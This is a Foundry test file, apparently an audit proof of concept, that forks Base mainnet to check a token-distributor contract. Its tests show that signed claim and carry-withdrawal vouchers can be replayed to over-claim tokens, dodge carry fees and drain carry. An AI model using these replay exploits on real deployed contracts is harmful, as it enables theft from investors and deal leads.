// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import {Test, console2} from "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MCK") {
        _mint(msg.sender, 1_000_000 ether);
    }
}

interface IDistributor {
    struct Price {
        uint256 tokenPriceUSDCNumerator;
        uint256 tokenPriceUSDCDenominator;
    }

    struct ClaimData {
        bytes16 tokenDistributionUUID;
        bytes16 entityUUID;
        address receiver;
        uint256 amount;
        Price price;
        uint256 expiresAt;
    }

    struct CarryWithdrawalData {
        bytes16 tokenDistributionUUID;
        bytes16 entityUUID;
        address receiver;
        uint256 amount;
        uint256 expiresAt;
    }

    struct Claimer {
        bytes16 entityUUID;
        address signer;
        uint64 amountInvestedUSDC;
        uint64 distributionShares;
        bool notChargedCarry;
    }

    struct CarryWithdrawer {
        bytes16 entityUUID;
        address signer;
        uint16 carryBPS;
    }

    struct Unlocker {
        address unlocker;
        bytes6 releasableType;
        bytes6 releaseType;
    }

    struct Init {
        IERC20 token;
        bytes16 tokenDistributionUUID;
        Unlocker unlocker;
        address genericRegistry;
        Claimer[] claimers;
        CarryWithdrawer[] carryWithdrawers;
        address adminIM;
        address managerIM;
        address adminENG;
        address managerENG;
        address platformSigner;
        address platformSender;
        bytes32 expectedClaimersRoot;
        uint16 platformCarryBPS;
    }

    function initialize(Init memory init) external;
    function claim(
        ClaimData calldata claimData,
        bytes calldata claimSignatureUser,
        bytes calldata claimSignaturePlatform,
        Claimer calldata user,
        bytes32[] calldata merkleProof,
        bool pullUnlocked
    ) external;
    function withdrawCarry(
        CarryWithdrawalData calldata data,
        bytes calldata userSignature,
        bytes calldata platformSignature
    ) external;
    function totalClaimed() external view returns (uint256);
    function totalCarryGenerated() external view returns (uint256);
    function totalCarryWithdrawn() external view returns (uint256);
    function domainSeparator() external view returns (bytes32);
}

contract EchoDistributorReplayPoCTest is Test {
    address constant DISTRIBUTOR_IMPL = 0x1798D23f29968b4fff7A60A90645B0939d04f47E;

    MockERC20 token;
    IDistributor distributor;

    uint256 userPrivateKey = 0xA11CE;
    address userAddress;

    uint256 dealLeadPrivateKey = 0xDEA1;
    address dealLeadAddress;

    uint256 platformSignerPrivateKey = 0xB0B;
    address platformSignerAddress;

    bytes16 constant DISTRIBUTION_UUID = 0x11111111111111111111111111111111;
    bytes16 constant ENTITY_UUID = 0x22222222222222222222222222222222;
    bytes16 constant DEAL_LEAD_UUID = 0x33333333333333333333333333333333;

    bytes32 constant CLAIM_TYPEHASH = keccak256(
        "ClaimData(bytes16 tokenDistributionUUID,bytes16 entityUUID,address receiver,uint256 amount,Price price,uint256 expiresAt)Price(uint256 tokenPriceUSDCNumerator,uint256 tokenPriceUSDCDenominator)"
    );
    bytes32 constant PRICE_TYPEHASH = keccak256("Price(uint256 tokenPriceUSDCNumerator,uint256 tokenPriceUSDCDenominator)");

    bytes32 constant CARRY_WITHDRAWAL_TYPEHASH = keccak256(
        "CarryWithdrawalData(bytes16 tokenDistributionUUID,bytes16 entityUUID,address receiver,uint256 amount,uint256 expiresAt)"
    );

    IDistributor.Claimer claimer;

    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org");

        userAddress = vm.addr(userPrivateKey);
        dealLeadAddress = vm.addr(dealLeadPrivateKey);
        platformSignerAddress = vm.addr(platformSignerPrivateKey);

        token = new MockERC20();

        claimer = IDistributor.Claimer({
            entityUUID: ENTITY_UUID,
            signer: userAddress,
            amountInvestedUSDC: 1_000 * 1e6, // $1,000 invested
            distributionShares: 10_000,
            notChargedCarry: false
        });

        IDistributor.Claimer[] memory claimers = new IDistributor.Claimer[](1);
        claimers[0] = claimer;

        IDistributor.CarryWithdrawer[] memory carryWithdrawers = new IDistributor.CarryWithdrawer[](1);
        carryWithdrawers[0] = IDistributor.CarryWithdrawer({
            entityUUID: DEAL_LEAD_UUID,
            signer: dealLeadAddress,
            carryBPS: 2000 // 20% carry
        });

        IDistributor.Init memory init = IDistributor.Init({
            token: IERC20(address(token)),
            tokenDistributionUUID: DISTRIBUTION_UUID,
            unlocker: IDistributor.Unlocker({unlocker: address(0), releasableType: bytes6(0), releaseType: bytes6(0)}),
            genericRegistry: address(0),
            claimers: claimers,
            carryWithdrawers: carryWithdrawers,
            adminIM: address(this),
            managerIM: address(this),
            adminENG: address(this),
            managerENG: address(this),
            platformSigner: platformSignerAddress,
            platformSender: address(this),
            expectedClaimersRoot: 0x31e499d50ec542313323f9138ad269503b89e28473381fecdd3a068f65adfef8,
            platformCarryBPS: 0 // 0% platform carry for clean test
        });

        address proxyAdmin = address(0xAD11111);
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(DISTRIBUTOR_IMPL, proxyAdmin, hex"");
        distributor = IDistributor(payable(address(proxy)));
        distributor.initialize(init);

        // Fund distributor with 1,000 tokens
        token.transfer(address(distributor), 1_000 ether);
    }

    function _signClaim(IDistributor.ClaimData memory data, uint256 privKey) internal view returns (bytes memory) {
        bytes32 priceHash = keccak256(
            abi.encode(PRICE_TYPEHASH, data.price.tokenPriceUSDCNumerator, data.price.tokenPriceUSDCDenominator)
        );

        bytes32 structHash = keccak256(
            abi.encode(
                CLAIM_TYPEHASH,
                data.tokenDistributionUUID,
                data.entityUUID,
                data.receiver,
                data.amount,
                priceHash,
                data.expiresAt
            )
        );

        bytes32 domainSeparator = distributor.domainSeparator();
        bytes32 digest = MessageHashUtils.toTypedDataHash(domainSeparator, structHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privKey, digest);
        return abi.encodePacked(r, s, v);
    }

    function _signCarryWithdrawal(IDistributor.CarryWithdrawalData memory data, uint256 privKey) internal view returns (bytes memory) {
        bytes32 structHash = keccak256(
            abi.encode(
                CARRY_WITHDRAWAL_TYPEHASH,
                data.tokenDistributionUUID,
                data.entityUUID,
                data.receiver,
                data.amount,
                data.expiresAt
            )
        );

        bytes32 domainSeparator = distributor.domainSeparator();
        bytes32 digest = MessageHashUtils.toTypedDataHash(domainSeparator, structHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privKey, digest);
        return abi.encodePacked(r, s, v);
    }

    // =========================================================================
    // PROPERTY A: Signature Uniqueness (FALSIFIED / NOT ENFORCED)
    // =========================================================================

    function test_PropertyA_SignatureUniqueness_Falsified() public {
        address receiver = address(0xCAFE);

        IDistributor.ClaimData memory claimData = IDistributor.ClaimData({
            tokenDistributionUUID: DISTRIBUTION_UUID,
            entityUUID: ENTITY_UUID,
            receiver: receiver,
            amount: 400 ether,
            price: IDistributor.Price({
                tokenPriceUSDCNumerator: 1e6, // $1.00 USDC
                tokenPriceUSDCDenominator: 1e18
            }),
            expiresAt: block.timestamp + 30 days
        });

        bytes memory sigUser = _signClaim(claimData, userPrivateKey);
        bytes memory sigPlatform = _signClaim(claimData, platformSignerPrivateKey);
        bytes32[] memory proof = new bytes32[](1);
        proof[0] = keccak256(bytes.concat(keccak256(abi.encode(claimer))));

        // 1st claim with signature: succeeds
        distributor.claim(claimData, sigUser, sigPlatform, claimer, proof, false);
        assertEq(token.balanceOf(receiver), 400 ether);

        // 2nd claim with identical signature: succeeds (no nonce or consumed digest check!)
        vm.warp(block.timestamp + 5 days);
        distributor.claim(claimData, sigUser, sigPlatform, claimer, proof, false);
        assertEq(token.balanceOf(receiver), 800 ether);

        // Consequence: A single authorization for 400 tokens was accepted multiple times.
    }

    // =========================================================================
    // PROPERTY B: Claim Accounting & Allocation Bound (PARTIALLY ENFORCED)
    // - Bounded by total SPV distributionShares (enforced)
    // - Bounded by individual signature authorization (NOT enforced)
    // =========================================================================

    function test_PropertyB_AllocationCapEnforced_SignatureCapViolated() public {
        address receiver = address(0xCAFE);

        IDistributor.ClaimData memory claimData = IDistributor.ClaimData({
            tokenDistributionUUID: DISTRIBUTION_UUID,
            entityUUID: ENTITY_UUID,
            receiver: receiver,
            amount: 400 ether,
            price: IDistributor.Price({
                tokenPriceUSDCNumerator: 1e6,
                tokenPriceUSDCDenominator: 1e18
            }),
            expiresAt: block.timestamp + 30 days
        });

        bytes memory sigUser = _signClaim(claimData, userPrivateKey);
        bytes memory sigPlatform = _signClaim(claimData, platformSignerPrivateKey);
        bytes32[] memory proof = new bytes32[](1);
        proof[0] = keccak256(bytes.concat(keccak256(abi.encode(claimer))));

        // Claim 1: 400 ether
        distributor.claim(claimData, sigUser, sigPlatform, claimer, proof, false);

        // Claim 2: 400 ether (total 800 ether claimed; violates 400 ether single-voucher intent)
        distributor.claim(claimData, sigUser, sigPlatform, claimer, proof, false);
        assertEq(token.balanceOf(receiver), 800 ether);

        // Claim 3: Replay again (400 ether).
        // Total available is 1,000 ether. 800 already claimed, leaving 200 ether claimable.
        // Attempting to claim 400 ether MUST revert with AmountExceedsClaimable(400 ether, 200 ether).
        vm.expectRevert(abi.encodeWithSelector(bytes4(keccak256("AmountExceedsClaimable(uint256,uint256)")), 400 ether, 200 ether));
        distributor.claim(claimData, sigUser, sigPlatform, claimer, proof, false);

        // Total claimed remains strictly capped at 800 ether
        assertEq(token.balanceOf(receiver), 800 ether);
    }

    // =========================================================================
    // PROPERTY C: Carry Accounting (FALSIFIED / EVADED VIA REPLAY)
    // - Demonstrates carry calculation under honest pricing vs. replayed stale pricing
    // =========================================================================

    function test_PropertyC_CarryAccounting_HonestBaseline() public {
        // Honest Claimant Scenario:
        // User invested $1,000 USDC.
        // Step 1: User claims 400 tokens at $1.00 USDC ($400 USDC).
        // Leaves $600 USDC unrecovered capital.
        address honestReceiver = address(0xCAFE);

        IDistributor.ClaimData memory claim1 = IDistributor.ClaimData({
            tokenDistributionUUID: DISTRIBUTION_UUID,
            entityUUID: ENTITY_UUID,
            receiver: honestReceiver,
            amount: 400 ether,
            price: IDistributor.Price({
                tokenPriceUSDCNumerator: 1e6, // $1.00 USDC
                tokenPriceUSDCDenominator: 1e18
            }),
            expiresAt: block.timestamp + 30 days
        });

        bytes memory sigUser1 = _signClaim(claim1, userPrivateKey);
        bytes memory sigPlat1 = _signClaim(claim1, platformSignerPrivateKey);
        bytes32[] memory proof = new bytes32[](1);
        proof[0] = keccak256(bytes.concat(keccak256(abi.encode(claimer))));

        distributor.claim(claim1, sigUser1, sigPlat1, claimer, proof, false);
        assertEq(distributor.totalCarryGenerated(), 0);

        // Step 2: Market price appreciates to $10.00 USDC.
        // User claims next 400 tokens with a FRESH honest voucher at $10.00 USDC:
        // 400 tokens * $10 = $4,000 USDC.
        // Unrecovered capital: $1,000 - $400 = $600 USDC.
        // Profit subject to carry: $4,000 - $600 = $3,400 USDC.
        // 20% carry = $680 USDC = 68 tokens!
        IDistributor.ClaimData memory claim2Honest = IDistributor.ClaimData({
            tokenDistributionUUID: DISTRIBUTION_UUID,
            entityUUID: ENTITY_UUID,
            receiver: honestReceiver,
            amount: 400 ether,
            price: IDistributor.Price({
                tokenPriceUSDCNumerator: 10e6, // $10.00 USDC
                tokenPriceUSDCDenominator: 1e18
            }),
            expiresAt: block.timestamp + 30 days
        });

        bytes memory sigUser2 = _signClaim(claim2Honest, userPrivateKey);
        bytes memory sigPlat2 = _signClaim(claim2Honest, platformSignerPrivateKey);

        distributor.claim(claim2Honest, sigUser2, sigPlat2, claimer, proof, false);

        // Honest result: 68 tokens of carry generated for deal lead!
        uint256 honestCarry = distributor.totalCarryGenerated();
        console2.log("Honest pricing total carry generated:", honestCarry / 1e18);
        assertEq(honestCarry, 68 ether);
        // Honest user receives: 400 (claim 1) + 332 (claim 2 after 68 carry deducted) = 732 ether
        assertEq(token.balanceOf(honestReceiver), 732 ether);
    }

    function test_PropertyC_CarryAccounting_ReplayEvasionExploit() public {
        // Exploitative Claimant Scenario:
        // User invested $1,000 USDC.
        // Step 1: User claims 400 tokens at $1.00 USDC ($400 USDC).
        address exploitReceiver = address(0xCAFE);

        IDistributor.ClaimData memory claim1 = IDistributor.ClaimData({
            tokenDistributionUUID: DISTRIBUTION_UUID,
            entityUUID: ENTITY_UUID,
            receiver: exploitReceiver,
            amount: 400 ether,
            price: IDistributor.Price({
                tokenPriceUSDCNumerator: 1e6, // $1.00 USDC
                tokenPriceUSDCDenominator: 1e18
            }),
            expiresAt: block.timestamp + 30 days
        });

        bytes memory sigUser = _signClaim(claim1, userPrivateKey);
        bytes memory sigPlat = _signClaim(claim1, platformSignerPrivateKey);
        bytes32[] memory proof = new bytes32[](1);
        proof[0] = keccak256(bytes.concat(keccak256(abi.encode(claimer))));

        distributor.claim(claim1, sigUser, sigPlat, claimer, proof, false);

        // Step 2: Market price is $10.00 USDC, but user REPLAYS the stale $1.00 USDC voucher!
        vm.warp(block.timestamp + 5 days);
        distributor.claim(claim1, sigUser, sigPlat, claimer, proof, false);

        // Exploitative result: Exactly 0 carry generated!
        uint256 exploitedCarry = distributor.totalCarryGenerated();
        console2.log("Exploitative replay total carry generated:", exploitedCarry);
        assertEq(exploitedCarry, 0);

        // Exploitative user receives all 800 tokens without paying 68 tokens of carry!
        assertEq(token.balanceOf(exploitReceiver), 800 ether);

        // Direct loss to Deal Lead: 68 ether (MCK tokens)
        console2.log("Carry defrauded from deal lead:", (68 ether - exploitedCarry) / 1e18);
    }

    // =========================================================================
    // PROPERTY D: Authorization Binding (ENFORCED)
    // - Verifies strict binding to chain, contract, claimant, campaign, amounts, expiry
    // =========================================================================

    function test_PropertyD_AuthorizationBinding_Enforced() public {
        address receiver = address(0xCAFE);

        IDistributor.ClaimData memory claimData = IDistributor.ClaimData({
            tokenDistributionUUID: DISTRIBUTION_UUID,
            entityUUID: ENTITY_UUID,
            receiver: receiver,
            amount: 400 ether,
            price: IDistributor.Price({
                tokenPriceUSDCNumerator: 1e6,
                tokenPriceUSDCDenominator: 1e18
            }),
            expiresAt: block.timestamp + 30 days
        });

        bytes memory sigUser = _signClaim(claimData, userPrivateKey);
        bytes memory sigPlatform = _signClaim(claimData, platformSignerPrivateKey);
        bytes32[] memory proof = new bytes32[](1);
        proof[0] = keccak256(bytes.concat(keccak256(abi.encode(claimer))));

        // 1. Negative Control: Expired timestamp
        vm.warp(block.timestamp + 31 days);
        vm.expectRevert(abi.encodeWithSelector(bytes4(keccak256("ClaimExpired(uint256)")), claimData.expiresAt));
        distributor.claim(claimData, sigUser, sigPlatform, claimer, proof, false);

        // Reset time
        vm.warp(block.timestamp - 31 days);

        // 2. Negative Control: Wrong tokenDistributionUUID
        IDistributor.ClaimData memory badDistUUID = claimData;
        badDistUUID.tokenDistributionUUID = bytes16(0x99999999999999999999999999999999);
        vm.expectRevert(abi.encodeWithSelector(bytes4(keccak256("WrongTokenDistribution(bytes16,bytes16)")), badDistUUID.tokenDistributionUUID, DISTRIBUTION_UUID));
        distributor.claim(badDistUUID, sigUser, sigPlatform, claimer, proof, false);

        // 3. Negative Control: Tampered receiver with original signature
        IDistributor.ClaimData memory badReceiver = claimData;
        badReceiver.receiver = address(0xBAD);
        vm.expectRevert(); // ECDSA recovery mismatch -> UnauthorizedUserSigner
        distributor.claim(badReceiver, sigUser, sigPlatform, claimer, proof, false);

        // 4. Negative Control: Tampered amount with original signature
        IDistributor.ClaimData memory badAmount = claimData;
        badAmount.amount = 500 ether;
        vm.expectRevert(); // ECDSA recovery mismatch -> UnauthorizedUserSigner
        distributor.claim(badAmount, sigUser, sigPlatform, claimer, proof, false);
    }

    // =========================================================================
    // PROPERTY E: State Transition Consistency & Atomicity (ENFORCED)
    // =========================================================================

    function test_PropertyE_StateTransitionConsistency() public {
        address receiver = address(0xCAFE);

        IDistributor.ClaimData memory claimData = IDistributor.ClaimData({
            tokenDistributionUUID: DISTRIBUTION_UUID,
            entityUUID: ENTITY_UUID,
            receiver: receiver,
            amount: 400 ether,
            price: IDistributor.Price({
                tokenPriceUSDCNumerator: 1e6,
                tokenPriceUSDCDenominator: 1e18
            }),
            expiresAt: block.timestamp + 30 days
        });

        bytes memory sigUser = _signClaim(claimData, userPrivateKey);
        bytes memory sigPlatform = _signClaim(claimData, platformSignerPrivateKey);
        bytes32[] memory proof = new bytes32[](1);
        proof[0] = keccak256(bytes.concat(keccak256(abi.encode(claimer))));

        uint256 contractBalBefore = token.balanceOf(address(distributor));
        assertEq(contractBalBefore, 1_000 ether);

        distributor.claim(claimData, sigUser, sigPlatform, claimer, proof, false);

        // Check internal invariants
        assertEq(distributor.totalClaimed(), 400 ether);
        assertEq(token.balanceOf(address(distributor)), contractBalBefore - 400 ether);

        // Failed transaction must revert state completely (Atomicity)
        vm.expectRevert();
        distributor.claim(claimData, hex"00", sigPlatform, claimer, proof, false);

        // State remains unchanged after revert
        assertEq(distributor.totalClaimed(), 400 ether);
        assertEq(token.balanceOf(address(distributor)), contractBalBefore - 400 ether);
    }

    // =========================================================================
    // Carry Withdrawal Replay (FALSIFIED / NOT ENFORCED)
    // =========================================================================

    function test_withdrawCarry_SignatureReplayExploit() public {
        // Step 1: Claim at $10.00 to generate carry
        address userReceiver = address(0xCAFE);
        IDistributor.ClaimData memory claimHigh = IDistributor.ClaimData({
            tokenDistributionUUID: DISTRIBUTION_UUID,
            entityUUID: ENTITY_UUID,
            receiver: userReceiver,
            amount: 1_000 ether,
            price: IDistributor.Price({
                tokenPriceUSDCNumerator: 10e6, // $10.00 USDC ($10,000 total)
                tokenPriceUSDCDenominator: 1e18
            }),
            expiresAt: block.timestamp + 30 days
        });

        bytes memory sigUser = _signClaim(claimHigh, userPrivateKey);
        bytes memory sigPlatform = _signClaim(claimHigh, platformSignerPrivateKey);
        bytes32[] memory proof = new bytes32[](1);
        proof[0] = keccak256(bytes.concat(keccak256(abi.encode(claimer))));

        distributor.claim(claimHigh, sigUser, sigPlatform, claimer, proof, false);

        uint256 carryGenerated = distributor.totalCarryGenerated();
        console2.log("Total carry generated in pool:", carryGenerated / 1e18);
        assertEq(carryGenerated, 180 ether);

        // Step 2: Deal lead authorizes partial withdrawal of 50 tokens
        address dealLeadReceiver = address(0xBEEF);
        IDistributor.CarryWithdrawalData memory carryData = IDistributor.CarryWithdrawalData({
            tokenDistributionUUID: DISTRIBUTION_UUID,
            entityUUID: DEAL_LEAD_UUID,
            receiver: dealLeadReceiver,
            amount: 50 ether,
            expiresAt: block.timestamp + 30 days
        });

        bytes memory leadSig = _signCarryWithdrawal(carryData, dealLeadPrivateKey);
        bytes memory platSig = _signCarryWithdrawal(carryData, platformSignerPrivateKey);

        // 1st withdrawal of 50 tokens (Authorized)
        distributor.withdrawCarry(carryData, leadSig, platSig);
        assertEq(token.balanceOf(dealLeadReceiver), 50 ether);

        // 2nd withdrawal of 50 tokens (Replay 1)
        distributor.withdrawCarry(carryData, leadSig, platSig);
        assertEq(token.balanceOf(dealLeadReceiver), 100 ether);

        // 3rd withdrawal of 50 tokens (Replay 2)
        distributor.withdrawCarry(carryData, leadSig, platSig);
        assertEq(token.balanceOf(dealLeadReceiver), 150 ether);

        // 4th withdrawal attempts to withdraw another 50 tokens.
        // Pool has 180 tokens total carry. 150 already withdrawn, leaving 30 tokens.
        // Attempting to withdraw 50 tokens reverts with AmountExceedsWithdrawableCarry(50 ether, 30 ether).
        vm.expectRevert(abi.encodeWithSelector(bytes4(keccak256("AmountExceedsWithdrawableCarry(uint256,uint256)")), 50 ether, 30 ether));
        distributor.withdrawCarry(carryData, leadSig, platSig);

        console2.log("Carry successfully drained via replays:", token.balanceOf(dealLeadReceiver) / 1e18);
        assertEq(distributor.totalCarryWithdrawn(), 150 ether);
    }
}
